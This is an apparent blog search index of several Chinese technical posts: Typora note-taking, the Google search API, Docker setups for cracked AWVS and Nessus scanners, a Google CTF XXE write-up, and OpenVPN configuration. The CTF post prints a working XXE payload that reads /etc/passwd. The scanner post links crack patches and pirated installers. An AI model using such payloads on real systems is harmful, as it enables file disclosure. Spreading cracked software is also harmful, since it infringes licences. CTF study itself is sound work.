<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>更换笔记系统到Typora及一些tricks</title>
      <link href="20200820/typora-and-tricks.html"/>
      <url>20200820/typora-and-tricks.html</url>
      
        <content type="html"><![CDATA[<p>苦各种云笔记久矣，抛弃有道云笔记，最后决定用 Typora + PicGo + Github 作为我的笔记系统</p><a id="more"></a><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>说起来，我也是有道云笔记付费好几年的用户了。由于我的笔记挺多的，代码尤甚，所以对搜索功能其实是强需求，而有道云笔记越改越垃圾，最后搜索功能已经变成一个废柴，做不到全文搜索，只能搜索到标题和前几行，这样的笔记应用对我而言已经是废品了。</p><p>一番查找之后，对比了一些方案，印象笔记和为知笔记用过一阵子，还是有点难受。发现 Typora 能满足我的需求：</p><ul><li>Markdown 写作，需要自动上传与备份图片</li><li>好用的全文搜索功能，可以忍受一定的速度</li><li>编辑器简洁、无广告、安全</li></ul><p>综合比较之后，我选择了 PicGo 作为图床，并且本地同时也保存一份。本地文件已经在 bitlocker 加密的磁盘中，由于不信任国内的云服务，考虑许久🤔后还是使用了 Github 作为自己的文章备份处。</p><h2 id="Typora设置"><a href="#Typora设置" class="headerlink" title="Typora设置"></a>Typora设置</h2><p>基本安装不表。安装完成后继续安装 PicGo，设置好 sm.ms 的图床后，打开 Typora，在<code>文件-偏好设置-图像</code>中如下设置好 ​，​但​建议​图片​保存​位置​是​完整路径，相对路径的话会保存到该 md 文件的相对路径 👇 ：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/20/9VbPFM8mrHjTSxC.png" alt="image-20200820204758230" title>                </div>                <div class="image-caption">image-20200820204758230</div>            </figure><p>在需要复制图片的时候直接在编辑器中粘贴即可，由于需要上传，这里需要手动再点一次上传图片 👇：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/20/ZWDjbzXPvHQpkCl.png" alt="image-20200820204940947" title>                </div>                <div class="image-caption">image-20200820204940947</div>            </figure><p>这样的话，本地和网络都会备份一份，以防图床丢失。</p><h2 id="文件备份"><a href="#文件备份" class="headerlink" title="文件备份"></a>文件备份</h2><p>在 Github 创建一个私有仓库，如果不清楚如何做的话可以看下 Github 在创建仓库完成后的界面，里面有教你如何上传。</p><p>备份的话我使用了 Windows 计划任务对我的文章定时上传到 Github，使用 Linux 可以直接用 Crontab。我可以容忍一定时间内的内容丢失，如果你对实时性要求高，并且对云服务比较放心的话，可以使用坚果云、Onedrive等，它们支持实时同步，如果使用坚果云付费的话也有历史版本功能，对我而言不太需要。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/20/ypjoECeRI6JYhnF.png" alt="image-20200820210355980" title>                </div>                <div class="image-caption">image-20200820210355980</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/20/kWZSaev7QFTpLmD.png" alt="image-20200820211958377" title>                </div>                <div class="image-caption">image-20200820211958377</div>            </figure><h2 id="一些Tricks"><a href="#一些Tricks" class="headerlink" title="一些Tricks"></a>一些Tricks</h2><ul><li>替代网页剪藏功能：网页上复制富文本，粘贴到 Typora 中可以自动转换为 Markdown，当然不是所有都有效。</li><li>LaTex 语法及 Markdown 的一些设置可以从偏好设置里面修改</li><li>支持 Pandoc，所以可以很好地转换为 doc 文档，这一点在工作里面很赞</li><li>使用 <code>:thinking:</code> 语法可以直接打出 emoji 表情 🤔</li><li>如果需要 debug Typora，可以直接 <code>shift+F12</code> 打开控制台查看</li><li>如果需要使用标签功能，可以在第一行写上 <code>#tag</code>，通过搜索功能来找到对应的 tag，这个是 <a href="https://support.typora.io/File-Management/#tags" target="_blank" rel="noopener">官方文档</a> 的建议</li></ul><h2 id="一些缺点"><a href="#一些缺点" class="headerlink" title="一些缺点"></a>一些缺点</h2><ul><li>安装占用 300M+，不过用的是 Electron 也可以理解…… 🤔</li><li>排序规则应用到了所有文件及文件夹，其实文件夹按名称排序，文件内容按修改日期排序是最好的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>用谷歌搜索API来爬取搜索结果</title>
      <link href="20200818/google-api-spider.html"/>
      <url>20200818/google-api-spider.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近需要爬取一些 google 搜索结果，首先看的就是有没有相关的 API，官方有提供 API 查询，但爬取量有一定限制。</p><a id="more"></a><h2 id="太长不看版"><a href="#太长不看版" class="headerlink" title="太长不看版"></a>太长不看版</h2><ol><li>接口地址为 <code>https://www.googleapis.com/customsearch/v1?key={YOUR_KEY}&amp;q={SEARCH_WORDS}&amp;cx={YOUR_CX}&amp;start={10}&amp;num={10}</code></li><li>KEY 从 <a href="https://console.developers.google.com/apis/credentials" target="_blank" rel="noopener">谷歌云 API 控制台</a> 来的，需要有外币卡先注册谷歌云账号。但似乎付费的话就不用这个 KEY 了，仅用 CX 即可，这个待查。</li><li>CX 从 <a href="https://programmablesearchengine.google.com/cse/create/new" target="_blank" rel="noopener">谷歌可编程搜索</a> 中来</li><li>一天只有 100 次的免费搜索限额，只能查询前 100 条。如需增加则 5 刀 1000 次，但一天上限 10000。 次，对于我来说已经足够用了</li></ol><h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>首先来到 <a href="https://developers.google.com/custom-search/v1/overview?hl=en_US" target="_blank" rel="noopener">Google Developers</a> 的相关文档页面，可以看到大概的介绍。</p><h3 id="生成-API-KEY"><a href="#生成-API-KEY" class="headerlink" title="生成 API KEY"></a>生成 API KEY</h3><p>点击 overview 中的 <a href="https://developers.google.com/custom-search/v1/overview#api_key" target="_blank" rel="noopener">Get a Key</a>，此处需要登录谷歌帐号，以及注册谷歌云帐号（应该需要绑定外币信用卡）并且创建一个 project，此处略过不表，最后你会得到一个 Key。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/08/fO9LzFWuNT1IBr3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>这个 Key 可以从<a href="https://console.developers.google.com/apis/credentials/key" target="_blank" rel="noopener">谷歌云控制台</a>中看到，建议加上应用限制和 API 限制，以防泄露后被滥用。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/08/z7Bj9Wt4ZPgAp61.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="生成-cx"><a href="#生成-cx" class="headerlink" title="生成 cx"></a>生成 cx</h3><p>cx 是 Google 可编程搜索引擎(Programmable Search Engine)的 id 标识，在此处 <a href="https://programmablesearchengine.google.com/cse/create/new" target="_blank" rel="noopener">新增搜索引擎</a> 可以获取。这里可以指定要搜索的网站，比如说我只希望通过该 API 搜索出来的网站是 shodan.io，谷歌语法里面相当于 <code>site:shodan.io</code>，可以这么设置：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/08/MnmrOZSitTsdGDX.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>新增完成之后点击修改搜索引擎，并点击设置，你就可以看到你的搜索引擎 id，就是我们说的 cx</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/08/bd3zuJ5wGfDUX2H.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>里面还有一些选项，自己可以看着修改~如果还想看看文档，可点击在页面下方一点的【以程序化方式访问】-【使用入门】</p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>JSON API 可以从 <a href="https://developers.google.com/custom-search/v1/introduction#api_overview" target="_blank" rel="noopener">文档</a> 中查看</p><p>完整的可请求参数如下，基本上和高级搜索保持一致：</p><pre><code>https://www.googleapis.com/customsearch/v1?q={searchTerms}&amp;num={count?}&amp;start={startIndex?}&amp;lr={language?}&amp;safe={safe?}&amp;cx={cx?}&amp;sort={sort?}&amp;filter={filter?}&amp;gl={gl?}&amp;cr={cr?}&amp;googlehost={googleHost?}&amp;c2coff={disableCnTwTranslation?}&amp;hq={hq?}&amp;hl={hl?}&amp;siteSearch={siteSearch?}&amp;siteSearchFilter={siteSearchFilter?}&amp;exactTerms={exactTerms?}&amp;excludeTerms={excludeTerms?}&amp;linkSite={linkSite?}&amp;orTerms={orTerms?}&amp;relatedSite={relatedSite?}&amp;dateRestrict={dateRestrict?}&amp;lowRange={lowRange?}&amp;highRange={highRange?}&amp;searchType={searchType}&amp;fileType={fileType?}&amp;rights={rights?}&amp;imgSize={imgSize?}&amp;imgType={imgType?}&amp;imgColorType={imgColorType?}&amp;imgDominantColor={imgDominantColor?}&amp;alt=json&quot;</code></pre><p>简化版：<code>https://www.googleapis.com/customsearch/v1?key={YOUR_KEY}&amp;q={SEARCH_WORDS}&amp;cx={YOUR_CX}&amp;start={10}&amp;num={10}</code></p><h2 id="存在的一些问题"><a href="#存在的一些问题" class="headerlink" title="存在的一些问题"></a>存在的一些问题</h2><h3 id="搜索结果与-API-不一致"><a href="#搜索结果与-API-不一致" class="headerlink" title="搜索结果与 API 不一致"></a>搜索结果与 API 不一致</h3><p>因为不同 IP 使用谷歌搜索会出现不一样的结果，比如美国和香港的 IP 访问必然会不一样。可以使用 API 中的 <code>lr</code> 参数修改语言选项，也可以在【修改搜索引擎】中修改语言和地区选项。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/08/B1XQjbknmqlYxGp.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="请求频率"><a href="#请求频率" class="headerlink" title="请求频率"></a>请求频率</h3><p>由于一天查的上限就这么多，所以等待时间尽量拉长吧，我 5-10s 请求一次没啥问题</p><h3 id="页数比第一页看到的结果数少"><a href="#页数比第一页看到的结果数少" class="headerlink" title="页数比第一页看到的结果数少"></a>页数比第一页看到的结果数少</h3><p>在第一页中，谷歌通常会显示比较多的结果，但是实际上很少有搜索结果能翻到100页的，甚至可能三四页就没了。这个是谷歌的策略吧，只会显示相关度比较高的页面……</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p><a href="https://developers.google.com/custom-search/docs/tutorial/introduction" target="_blank" rel="noopener">https://developers.google.com/custom-search/docs/tutorial/introduction</a><br><a href="https://developers.google.com/custom-search/v1/reference/rest" target="_blank" rel="noopener">https://developers.google.com/custom-search/v1/reference/rest</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自用Docker版Nessus和WVS破解版</title>
      <link href="20190727/docker-nessus-awvs.html"/>
      <url>20190727/docker-nessus-awvs.html</url>
      
        <content type="html"><![CDATA[<p>自己一直在用的 Docker 版的 AWVS 和 Nessus，build 一次即可爽歪歪</p><a id="more"></a><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><ol><li>因为破解版有些问题，有时候一个星期后虽然仍然显示永久激活，但实际上并不可用，二次激活会出现奇怪的问题，每次要用的时候要是突然失去激活状态很容易令人崩溃</li><li>其它人发的 docker 不是很透明，担心不可控，还是自己写一个吧又不难……</li><li>破解版做一下隔离会比较好，毕竟服务器跑着很多奇怪的东西</li><li>docker 版重新部署很快，容易迁移</li></ol><p>因此萌发了用 docker 做扫描器的想法。</p><h2 id="关于破解补丁"><a href="#关于破解补丁" class="headerlink" title="关于破解补丁"></a>关于破解补丁</h2><p>破解补丁均用的是 52pojie 和 t00ls 中分享的，如果不放心的话大可自己替换，对 Dockerfile 稍作修改就可以了~</p><h2 id="WVS-快速部署"><a href="#WVS-快速部署" class="headerlink" title="WVS 快速部署"></a>WVS 快速部署</h2><ol><li>使用的 AWVS 安装包从官网下载或使用文末的百度网盘下载~</li><li>将破解补丁 <code>patch_awvs</code> 和安装包 <code>acunetix_trail.sh</code> 放在该目录下。安装包可以直接从官网下载，而破解补丁用的是广为流传的、52破解上的破解补丁，如有担心可以更换为自己信任的补丁</li><li>运行 Dockerfile</li><li>成功运行后需要手动进入容器进行激活，不过也很简便啦</li><li>用户名密码：<a href="mailto:admin@test.com" target="_blank" rel="noopener">admin@test.com</a>/Aa123456，可在 Dockerfile 自行修改</li></ol><pre><code class="bash">#build imagedocker build -t test/wvs .#按需修改docker run -m 2048M -d -p 13443:13443 --name wvs test/wvs#进入容器 patchdocker exec -it -u root wvs /bin/bash#运行&gt; ./patch_awvs</code></pre><p>目前的缺陷是数据库没法做持久化，不知道是我的姿势有误还是什么问题……解决方法是使用漏洞管控平台对接，如 <a href="https://gitee.com/gy071089/SecurityManageFramwork" target="_blank" rel="noopener">SeMF</a> 之类的 SIEM 平台</p><h2 id="Nessus-快速部署"><a href="#Nessus-快速部署" class="headerlink" title="Nessus 快速部署"></a>Nessus 快速部署</h2><ol><li>建立image</li><li>运行容器，等待插件安装完成即可</li></ol><pre><code class="bash">docker build -t test/nessus .#视情况决定是否使用Volumedocker run -d -m 2048M -v NESSUS_VOL:/opt/nessus -v /usr/share/zoneinfo:/usr/share/zoneinfo:ro -p 8834:8834 --name nessus test/nessus</code></pre><ol start="3"><li>修改密码，默认用户名为 Nessus</li></ol><pre><code class="bash">docker exec -it nessus /bin/bash/opt/nessus/sbin/nessuscli chpasswd Nessus</code></pre><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>非常 easy 的一套做法，妈妈再也不用担心我的破解版失效了~ Github 链接可点击或阅读原文查看：</p><p><a href="https://github.com/Leezj9671/SecDevices_docker" target="_blank" rel="noopener">https://github.com/Leezj9671/SecDevices_docker</a></p><p>关于破解版资源可访问百度网盘： </p><p>pan.baidu.com/s/1KT1vzGvZLSZcCxVLr5ZHXg 提取码: 6iak</p><p><em>资源均从52pojie、t00ls下载，可自行比对哈希值</em></p>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> awvs </tag>
            
            <tag> nessus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019GoogleCTF-web-bnv XXE 题目</title>
      <link href="20190710/2019GoogleCTF-web-bnv.html"/>
      <url>20190710/2019GoogleCTF-web-bnv.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://capturetheflag.withgoogle.com" target="_blank" rel="noopener">Google CTF 2019</a> 刚过不久，来一波复现~</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目地址是 <a href="https://bnv.web.ctfcompetition.com/" target="_blank" rel="noopener">https://bnv.web.ctfcompetition.com/</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d248664c176f87951.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>题目描述：</p><blockquote><p>这是一个没有啥好看的 enterprise-ready™ Web应用程序。</p></blockquote><h2 id="搞！"><a href="#搞！" class="headerlink" title="搞！"></a>搞！</h2><p>点开链接一看，为什么这么黑……</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d2487576b0f474366.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>从网页标题和中间的图片很明显是盲文，结合题目，应该是一个盲人用的网站？</p><p>网页中央是说“请使用这个搜索引擎，找一个离你最近的组织”，下拉框有三个城市可选。</p><p>先看一下搜索会发生啥吧：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d248878db21350572.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d2488610f3bb36760.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>POST 搜索接口一条 message，估计是盲文代码？然后返回了相应的信息。</p><p>看一下 JavaScript 是怎么写的吧：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d24884954c8528338.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>数一数 blindvalues 数组，刚好 26 个，猜想是不是字母一一对应捏，打开 Console 验证一下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d2489cf9840625370.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>跟 message 一模一样~ 先想一想，如果该题是 SQL 注入的话，那这题只能使用纯字母，并且忽略大小写，这个有点难整啊…… 使用特殊标点符号 Fuzz 一下，一点用都没有。</p><p>思来想去，搜到了一个奇妙的渗透手法：基于 Json 的 web 服务也有可能存在着 XXE 注入！试一试提交 XML：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d248bd12f38049873.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>哎嘿？似乎可行？扔一个和提交 Json 相同意义的 XML 试试？</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ELEMENT message ANY&gt;]&gt;&lt;message&gt;135601360123502401401250&lt;/message&gt;</code></pre><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d248c7bbd42596019.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>哎嘿？似乎成功近在眼前了？赶紧翻 payload……整了好久，在 Burp 官网上看到了一个比较新颖的使用本地 DTD 读取文件的方法 <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd" target="_blank" rel="noopener">Exploiting XXE to retrieve data by repurposing a local DTD</a></p><p>这个 payload 主要是利用错误信息来打印目标文件的内容，重新定义了 <code>docbookx.dtd</code> （一般有 Gnome 就有它）里面的 <code>ISOamso</code>。我们提交了这个 payload 之后，当导入本地的 DTD 文件时，会优先执行我们定义的 <code>ISOamso</code>，因此可以达成任意文件读取。</p><p>使用该 payload 成功读取：</p><pre><code class="xml">&lt;!DOCTYPE message [    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;error;    &#39;&gt;    %local_dtd;]&gt;</code></pre><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d248f4cc96d187582.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>猜一下路径 <code>/flag</code>，对啦✔</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d248fd122e0066657.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>算是一道不错的 XXE 利用题目，又学习到了新的利用方式~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker-OpenVPN搭建局域网记录</title>
      <link href="20190515/openvqn.html"/>
      <url>20190515/openvqn.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要搞个公司内网穿透类似的东东，需要从外网连接到办公内网，一波挑选之后决定采用 OpenVPN。由于需要搭一个大内网，且不妨碍访问外网，并且要求客户端之间也要互通，搜了一下网上都没有 docker 版本的说明，倒腾两天，记录一下。</p><a id="more"></a><h2 id="机器配置"><a href="#机器配置" class="headerlink" title="机器配置"></a>机器配置</h2><p>机器:</p><ul><li>服务端 CentOS 7.3</li><li>客户端 Windows 10/Ubuntu Server 16.04</li></ul><p>其实是什么平台都不重要，因为全篇都在 docker 下玩的</p><p>Git 项目：</p><ul><li><a href="https://github.com/kylemanna/docker-openvpn" target="_blank" rel="noopener">kylemanna/docker-openvpn</a></li></ul><h2 id="安装Docker-拉取镜像"><a href="#安装Docker-拉取镜像" class="headerlink" title="安装Docker,拉取镜像"></a>安装Docker,拉取镜像</h2><pre><code class="bash">sudo yum -y install docker.iodocker pull kylemanna/openvpn</code></pre><h2 id="配置OpenVPN"><a href="#配置OpenVPN" class="headerlink" title="配置OpenVPN"></a>配置OpenVPN</h2><ol><li>配置数据卷，生成配置文件。预计网段人数不多，使用192.168.0.0/24网段，但需要注意的是在配置固定IP时，掩码必须为/30，因此固定IP需要注意正确配置。</li></ol><pre><code class="bash">#配置数据卷export OVPN_DATA=openvpn-datadocker volume create --name $OVPN_DATA#生成配置文件#-d 取消默认配置     -c 打开c2c模式     -u 指定当前IP#-s 划分服务器子网     -C 指定算法docker run -v $OVPN_DATA:/etc/openvpn --rm kylemanna/openvpn ovpn_genconfig -d -c -C &#39;AES-256-CBC&#39; -u udp://SERVER_IP -s 192.168.100.0/24</code></pre><ol start="2"><li>生成密钥文件，输入密钥和CA名称</li></ol><pre><code class="bash">docker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn ovpn_initpki</code></pre><ol start="3"><li>运行容器</li></ol><pre><code class="bash">#开启特权docker run -v $OVPN_DATA:/etc/openvpn -d -p 1194:1194/udp --restart=on-failure:10 --cap-add=NET_ADMIN --name=openvpn --privileged=true kylemanna/openvpn#登陆dockerdocker run -v $OVPN_DATA:/etc/openvpn -it --rm kylemanna/openvpn bash -l</code></pre><h2 id="用户操作"><a href="#用户操作" class="headerlink" title="用户操作"></a>用户操作</h2><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><ol><li>生成证书</li></ol><pre><code class="bash">#生成客户端证书，输入密钥docker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn easyrsa build-client-full CLIENTNAME nopass#需要配置密码则删掉nopassdocker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn easyrsa build-client-full testuser</code></pre><ol start="2"><li>导出证书</li></ol><pre><code class="bash">#将用户证书导出到本地文件docker run -v $OVPN_DATA:/etc/openvpn --rm kylemanna/openvpn ovpn_getclient testuser &gt; testuser.ovpn</code></pre><ol start="3"><li>如果有需要，需要给某个用户生成固定ip，操作如下：</li></ol><pre><code class="bash">//注意掩码为/30，配置固定IP需要保证其可用echo &quot;ifconfig-push 192.168.100.5 192.168.100.6&quot; &gt; /var/lib/docker/volumes/&quot;$OVPN_DATA&quot;/_data/ccd/client1</code></pre><h3 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h3><pre><code class="bash">//删除用户证书docker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn easyrsa revoke user//更新证书数据库docker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn easyrsa gen-crl update-db//重启openvpn容器docker restart openvpn</code></pre><h2 id="客户端下载及安装"><a href="#客户端下载及安装" class="headerlink" title="客户端下载及安装"></a>客户端下载及安装</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><blockquote><p><a href="https://openvpn.net/community-downloads/" target="_blank" rel="noopener">https://openvpn.net/community-downloads/</a></p></blockquote><p>下载对应客户端后，在系统上安装 OpenVPN 客户端软件，将导出的文件 xx.ovpn 放到 OpenVPN 的配置文件夹中，默认是C:\Program Files\OpenVPN\config。或者直接打开 OpenVPN 客户端，右键-导入配置文件。</p><p>运行 OpenVPN 客户端软件，连接即可</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Linux更为简单: </p><pre><code class="bash">#先安装openvpnsudo apt install openvpn#配置.ovpn为配置文件openvpn --config xxx.ovpn</code></pre><h2 id="增删用户脚本"><a href="#增删用户脚本" class="headerlink" title="增删用户脚本"></a>增删用户脚本</h2><p>为了减少工作量，方便快速配置，可以使用如下两个增添用户的脚本。</p><p>OpenVPN 创建用户脚本：</p><pre><code class="bash">#!/bin/bashread -p &quot;please your username: &quot; NAMEOVPN_DATA=&quot;openvpn-data&quot;LOCALIP=&quot;IP&quot;docker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn easyrsa build-client-full $NAME nopassdocker run -v $OVPN_DATA:/etc/openvpn --rm kylemanna/openvpn ovpn_getclient $NAME &gt; /data/openvpn/conf/&quot;$NAME&quot;.ovpn#修改端口(可选)sed -i &quot;s/$LOCALIP 1194/$LOCALIP 1194/g&quot; /data/openvpn/conf/&quot;$NAME&quot;.ovpn#压缩(可选)echo &quot;comp-lzo&quot; &gt;&gt; /data/openvpn/conf/&quot;$NAME&quot;.ovpndocker restart openvpnecho &quot;CA saved to /data/openvpn/conf/$NAME.ovpn&quot;</code></pre><p>OpenVPN 删除用户脚本：</p><pre><code class="bash">#!/bin/bashread -p &quot;Delete username: &quot; DNAMEOVPN_DATA=&quot;openvpn-data&quot;docker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn easyrsa revoke $DNAMEdocker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn easyrsa gen-crldocker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn rm -f /etc/openvpn/pki/reqs/&quot;$DNAME&quot;.reqdocker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn rm -f /etc/openvpn/pki/private/&quot;$DNAME&quot;.keydocker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn rm -f /etc/openvpn/pki/issued/&quot;$DNAME&quot;.crt#删除相关用户conf(可选)docker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn rm -f /data/openvpn/conf/&quot;$DNAME&quot;docker restart openvpnecho &quot;Deleted $DNAME&quot;</code></pre><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>docker pull 一个Nginx，连接VPN服务器，先 ping ，互相 curl。</p><h2 id="systemd持久化"><a href="#systemd持久化" class="headerlink" title="systemd持久化"></a>systemd持久化</h2><p>目的：自动下载最新的 <code>docker-openvpn</code> 镜像并更新；如果服务挂掉, systemd 可以设定为每隔10秒进行重启。</p><ol><li><p>设定 volume</p><pre><code class="bash">OVPN_DATA=&quot;openvpn-data&quot;docker volume create --name $OVPN_DATA</code></pre></li><li><p>初始化容器</p><pre><code class="bash">docker run -v $OVPN_DATA:/etc/openvpn --rm kylemanna/openvpn ovpn_genconfig -u udp://VPN.SERVERNAME.COMdocker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn ovpn_initpki</code></pre></li><li><p>下载 docker-openvpn@.service 放到 <code>/etc/systemd/system</code>，根据实际情况修改</p><pre><code class="bash">curl -L https://raw.githubusercontent.com/kylemanna/docker-openvpn/master/init/docker-openvpn%40.service | sudo tee /etc/systemd/system/docker-openvpn@.service</code></pre></li><li><p>设定开机启动</p><pre><code class="bash">systemctl enable --now docker-openvpn@example.service</code></pre></li><li><p>验证一下</p><pre><code class="bash">systemctl status docker-openvpn@example.servicejournalctl --unit docker-openvpn@example.service</code></pre></li></ol><h2 id="错误记录"><a href="#错误记录" class="headerlink" title="错误记录"></a>错误记录</h2><ol><li><p>连接时发生<code>write to TUN/TAP : Invalid argument (code=22)</code></p><p> 服务端启用了 <code>comp-lzo</code>，但生成的客户端 ovpn 文件没有，添加 <code>comp-lzo</code> 到 *.ovpn即可</p></li><li><p>连接时报 Warning:<code>WARNING: this cipher&#39;s block size is less than 128 bit (64 bit).  Consider using a --cipher with a larger block size.</code></p><p> 进入容器看看支持哪些算法：<code>openvpn --show-ciphers</code>，挑一个在 genconfig 的时候使用 <code>-C</code> 参数进行配置：<code>docker run -v $OVPN_DATA:/etc/openvpn --rm kylemanna/openvpn ovpn_genconfig -u udp://vpn.example.com -C $CIPHER</code></p></li></ol><h2 id="高级安全"><a href="#高级安全" class="headerlink" title="高级安全"></a>高级安全</h2><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><p>安全高要求下可以离线备份，本场景不需要。</p><pre><code># 备份到存档docker run -v $OVPN_DATA:/etc/openvpn --rm kylemanna/openvpn tar -cvf - -C /etc openvpn | xz &gt; openvpn-backup.tar.xz# 恢复到新数据卷docker volume create --name $OVPN_DATAxzcat openvpn-backup.tar.xz | docker run -v $OVPN_DATA:/etc/openvpn -i kylemanna/openvpn tar -xvf - -C /etc</code></pre><h3 id="CA-root-key安全"><a href="#CA-root-key安全" class="headerlink" title="CA root key安全"></a>CA root key安全</h3><p>本场景无需如此，先做记录。ovpn_copy_server_files 脚本将所有需要的配置放在默认的子目录中 $OPENVPN/server</p><pre><code class="bash">docker run --net=none --rm -t -i -v $PWD:/etc/openvpn kylemanna/openvpn ovpn_genconfig -u udp://VPN.SERVERNAME.COMdocker run --net=none --rm -t -i -v $PWD:/etc/openvpn kylemanna/openvpn ovpn_initpkidocker run --net=none --rm -t -i -v $PWD:/etc/openvpn kylemanna/openvpn ovpn_copy_server_files</code></pre><h2 id="其它记录"><a href="#其它记录" class="headerlink" title="其它记录"></a>其它记录</h2><p>以下为记录，并未操作</p><h3 